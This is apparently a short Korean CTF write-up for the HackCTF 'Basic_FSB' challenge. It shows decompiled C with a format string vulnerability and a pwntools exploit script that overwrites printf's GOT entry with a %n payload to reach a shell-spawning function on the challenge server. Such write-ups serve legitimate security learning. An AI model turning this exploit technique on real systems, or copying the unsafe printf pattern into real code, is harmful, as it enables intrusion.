---
title: "[HackCTF]Basic_FSB"
date: 2020-1-8
tags: [HackCTF]
categories: [HackCTF]
---

FSB 공부할겸 다시 풀어봤다. 이 문제 샤야테님 강의에 있던 문제랑 거의 유사하다.

```c
int vuln()
{
  char s; // [esp+0h] [ebp-808h]
  char format; // [esp+400h] [ebp-408h]

  printf("input : ");
  fgets(&s, 1024, stdin);
  snprintf(&format, 1024u, &s);
  return printf(&format);
}
```

메인에서 FSB가 터진다. 

```c
int flag()
{
  puts("EN)you have successfully modified the value :)");
  puts("KR)#값조작 #성공적 #플래그 #FSB :)");
  return system("/bin/sh");
}
```

printf@got를 flag주소로 변경해주면 될 것이다.

> exploit.py

```python
from pwn import *

e = ELF('./basic_fsb')
#p = process('./basic_fsb')
p = remote('ctf.j0n9hyun.xyz',3002)
offset = 2

payload = p32(e.got['printf'])
payload += '%' + str(e.symbols['flag'] - 4) + 'c'
payload += '%{}$n'.format(2)

p.sendlineafter(':',payload)

p.interactive()
```

